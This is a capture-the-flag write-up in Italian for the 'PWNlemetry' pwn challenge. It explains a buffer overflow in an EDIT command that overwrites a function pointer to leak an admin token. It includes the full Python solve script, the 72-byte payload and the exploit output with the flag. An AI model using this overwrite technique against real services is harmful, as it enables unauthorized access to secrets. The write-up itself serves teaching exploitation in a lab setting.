# Writeup - PWNlemetry (pwn / medium, WPCTF 2025)

## Obiettivo
Ottenere la lista di tutti gli host monitorati dal server PWNlemetry. La lista si
ottiene col comando `DUMP`, ma `DUMP` richiede un **admin token** che non
possediamo.

**Flag:** `WPCTF{N0O0o0oo_l4_p0l15ssiA4A4a4}`

---
## 1. Ricognizione

Il binario `pwnlemetry` funziona sia da **server** (`--server`) sia da **client**
(senza argomenti). Se provo con: nc 127.0.0.1 31337 non mi da nulla 

Comandi del protocollo: `REGISTER`, `UPDATE`, `EDIT`, `VIEW`, `DUMP`, `PING`.

### Protezioni del binario (`checksec`)
```
Arch:   amd64-64-little
RELRO:  Full RELRO
Stack:  Canary found
NX:     enabled
PIE:    No PIE (0x400000)   <- cruciale
```
Il **No PIE** e' il regalo: il binario e' caricato sempre allo stesso indirizzo
fisso -> gli indirizzi delle funzioni sono noti e stabili, senza bisogno di alcun
leak.

### Come avviare l'ambiente
```bash
# 1. build dell'immagine
bash build.sh
# 2. avvio del server (terminale 1)
docker run --rm -p 31337:31337 wpctf2025-challenges:pwnlemetry
# 3. interazione (terminale 2): client incluso oppure lo script di questo writeup
./pwnlemetry        # client interattivo, si collega a 127.0.0.1:31337
```

---

## 2. Background teorico

### 2.1 `struct` e puntatori - sintassi `.` vs `->`
Una `struct` e' un contenitore di campi. Se hai la struttura "in mano" usi il
punto (`var.campo`); se hai un **puntatore** alla struttura (cioe' il suo
**indirizzo**) usi la freccia (`ptr->campo`). `h->campo` e' l'abbreviazione di
`(*h).campo`: "segui l'indirizzo `h`, poi entra nel campo". Nel server gli host
sono creati con `malloc` e maneggiati sempre via puntatore (`struct Host *h`).

### 2.2 Puntatore a funzione
`print_fn` non e' una funzione, e' una **casella che contiene l'indirizzo** di una
funzione (come un numero salvato in rubrica). `h->print_fn(a, b)` significa:
"chiama la funzione il cui indirizzo e' salvato in `print_fn`, passandole `a` e
`b`". Cambiando l'indirizzo salvato, cambi *quale* funzione viene eseguita, senza
toccare il codice chiamante.

### 2.3 Dimensioni: perche' 8 byte
Sistema a **64 bit** -> ogni indirizzo (e quindi ogni puntatore) e' lungo 64 bit =
**8 byte**. Il campo `print_fn` occupa quindi 8 byte. Per sovrascriverlo servono
esattamente 8 byte.

### 2.4 Calling convention (System V x86-64)
Gli argomenti di una funzione viaggiano in registri fissi, in ordine fisso,
deciso **automaticamente dal compilatore** (non dal programmatore):
`rdi` = 1 arg, `rsi` = 2, `rdx` = 3, `rcx` = 4, `r8` = 5, `r9` = 6, poi stack.
Chi chiama riempie i registri; chi e' chiamato li legge. Entrambi si fidano della
stessa regola. Una funzione che usa **meno** argomenti semplicemente **ignora** i
registri in piu'.

### 2.5 Little-endian
Su x86-64 i byte di un valore multi-byte sono memorizzati **dal meno
significativo al piu' significativo** (ordine "invertito"). Un indirizzo va quindi
scritto in memoria al contrario rispetto a come lo leggiamo.

---

## 3. La vulnerabilita'

### 3.1 La struttura `Host`
```c
struct Host {
  char name[64];                           // offset 0x00
  void (*print_fn)(char*, struct Host*);   // offset 0x40 (64)  <- puntatore a funzione (64 in hex = 0x40) 
  char token[32];                          // offset 0x48 (72)
  double cpu;                              // offset 0x68
  double ram;                              // offset 0x70
};
```
Subito **dopo** `name[64]` c'e' `print_fn`. Alla creazione (`add_host`) `print_fn`
vale `get_host_view` (la funzione che stampa `HOST <name> CPU.. RAM..`).

### 3.2 Il buffer overflow (comando `EDIT`)
```c
long len = atol(len_s);
if (... || len <= 0 || len > 4096) { ... }   // accetta len fino a 4096
...
char *buf = malloc(len);
read_n_fd(client_fd, buf, len);               // legge len byte dal socket
// *** VULNERABLE COPY: no bounds check -> overflow from name into print_fn
memcpy(h->name, buf, len);                     // copia in name[64] SENZA controllo
```
`name` e' di soli 64 byte ma `EDIT` accetta fino a 4096 byte e li copia senza
controlli. Mandando **piu' di 64 byte** si sfora `name` e si scrive nei campi
successivi - in primis **`print_fn`**.

### 3.3 Dove scatta la trappola (comando `VIEW`)
```c
char buf[MAX_VIEW_LEN];
h->print_fn(buf, h);              // chiama il puntatore (eventualmente corrotto)
send_line_fd(client_fd, buf);     // e ci rimanda indietro buf
```
`VIEW` chiama `print_fn` e poi **ci rispedisce `buf`**. Se dirottiamo `print_fn`
verso una funzione che scrive un segreto in `buf`, quel segreto ci torna indietro.

---

## 4. La strategia

L'obiettivo e' l'admin token. Esso **non e' dentro `Host`**: e' una variabile
globale separata (`static char admin_token[64]`), riempita da:
```c
void read_admin_token(char *buf);   // scrive l'admin token nel buffer passato
```
Firma perfetta: prende **un solo `char* buf`** come 1 argomento. Grazie alla
calling convention, quando `VIEW` fa `h->print_fn(buf, h)`:
- `rdi` = `buf` -> `read_admin_token` lo usa (ci scrive il token);
- `rsi` = `h`   -> ignorato (innocuo).

Poi `VIEW` fa `send_line_fd(fd, buf)` e **ci manda il token**.

> Perche' non `process_command`? Perche' la sua firma e'
> `(int client_fd, const char* line)`: il 1 argomento dovrebbe essere un `int`,
> non un `char*`. Passandogli `buf` (un puntatore) come `client_fd`, lo
> interpreterebbe come un file descriptor senza senso -> non funziona. Il bersaglio
> deve avere il **tipo** del 1 argomento compatibile con `buf`.

### Catena completa
```
README -> servono tutti gli host -> serve DUMP -> DUMP richiede l'admin token
   -> l'admin token sta in una globale del server, NON in h
   -> ma possiamo corrompere h->print_fn (overflow in EDIT)
   -> farlo puntare a read_admin_token (indirizzo fisso, grazie a No PIE)
   -> VIEW esegue h->print_fn(buf) = read_admin_token(buf) -> ci rimanda l'ADMIN TOKEN
   -> DUMP <admin_token> -> lista di tutti gli host  <- FLAG
```

---

## 5. Costruzione dell'exploit

### 5.1 Indirizzo del bersaglio
```bash
nm pwnlemetry | grep read_admin_token
# 00000000004040a7 t read_admin_token
```
`0x4040a7`. La colonna `t` = funzione (segmento *text*); fisso grazie al No PIE.

### 5.2 Il payload dell'`EDIT` (72 byte)
```
payload = b"A" + b"\x00"*63 + p64(0x4040a7)
          |-1-|  |--63 NULL--|  |---8 byte addr (little-endian)---|
          |------- 64 byte: campo name -------||-- 8 byte: print_fn --|
```
- 72 byte totali -> riempiono `name` (0-63) e sovrascrivono `print_fn` (64-71),
  **senza** toccare `token` (72+), che ci serve intatto.
- `memcpy` copia **tutti** i byte, nulli inclusi -> `print_fn` viene davvero
  sovrascritto.
- Trucco sul nome: `name` e' `"A"` seguito da `\x00`, quindi la **stringa** nome
  resta `"A"` -> dopo l'`EDIT` possiamo ancora fare `VIEW A` senza byte strani nel
  comando.
- Little-endian di `0x4040a7`: `a7 40 40 00 00 00 00 00`.

### 5.3 Il protocollo "sul filo"
- `REGISTER <hlen>\n` + `<hlen>` byte di hostname -> risposta `TOKEN <tok>\n`
- `EDIT <host> <tok> <len>\n` + `<len>` byte di payload -> `EDITOK\n`
- `VIEW <host> <tok>\n` -> `<admin_token>` + `VIEWOK\n`
- `DUMP <admin_token>\n` -> lista di tutti gli host

### 5.4 Script risolutore (`solve.py`)
```python
#!/usr/bin/env python3
import socket, struct

HOST, PORT = "127.0.0.1", 31337
ADDR = 0x4040a7                      # indirizzo di read_admin_token (letto con nm)

def recv_all(s, t=0.5):              # legge la risposta del server
    s.settimeout(t)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
    except socket.timeout:
        pass
    return data

s = socket.socket()
s.connect((HOST, PORT))

# 1) REGISTER: creo l'host "A" e ottengo il suo token
s.sendall(b"REGISTER 1\n")           # "sto per mandarti 1 byte di hostname"
s.sendall(b"A")                      # l'hostname (1 byte)
resp = recv_all(s)
token = resp.split()[1].decode()     # dalla risposta "TOKEN xxxx" prendo xxxx

# 2) EDIT: overflow di name (64 byte) + sovrascrivo print_fn (8 byte)
payload = b"A" + b"\x00" * 63 + struct.pack("<Q", ADDR)   # 72 byte totali
s.sendall(f"EDIT A {token} {len(payload)}\n".encode())    # la riga di comando
s.sendall(payload)                                        # i 72 byte grezzi
recv_all(s)                                               # EDITOK

# 3) VIEW: fa scattare read_admin_token -> il server mi rimanda l'admin token
s.sendall(f"VIEW A {token}\n".encode())
view = recv_all(s)
admin = view.split(b"VIEWOK")[0].strip().decode()         # estraggo l'admin token
print("ADMIN TOKEN:", admin)

# 4) DUMP: con l'admin token ottengo la lista di TUTTI gli host
s.sendall(f"DUMP {admin}\n".encode())
print(recv_all(s).decode(errors="replace"))
s.close()
```

### 5.5 Output
```
ADMIN TOKEN: 28faccbebf5b673a33bb00f80dd12636
HOST ansible.builtin.fail CPU 75.05 RAM 20.05
HOST downloadmoreram.com CPU 87.03 RAM 77.91
HOST WPCTF{N0O0o0oo_l4_p0l15ssiA4A4a4} CPU 45.85 RAM 25.28
HOST shouldideploy.today CPU 46.64 RAM 58.15
28faccbebf5b673a33bb00f80dd12636          <- il nostro host "A": print_fn ancora dirottato
```

---

## 6. Verifica: l'abbiamo ottenuta legittimamente?
Si'. Lo script non apre mai `monitors.dat`: parla **solo via socket** col server.
Il file `.dat` e' solo il seme che il server carica **all'avvio** in memoria; la
flag vive come host nell'heap del processo. Senza l'admin token il `DUMP` avrebbe
risposto `BADTOK`. L'ultima riga dell'output (l'admin token ristampato al posto
dell'host "A") e' la **firma** della corruzione: nel `DUMP` il server chiama
`print_fn` per ogni host, e per il nostro host quel puntatore e' ancora
`read_admin_token`.


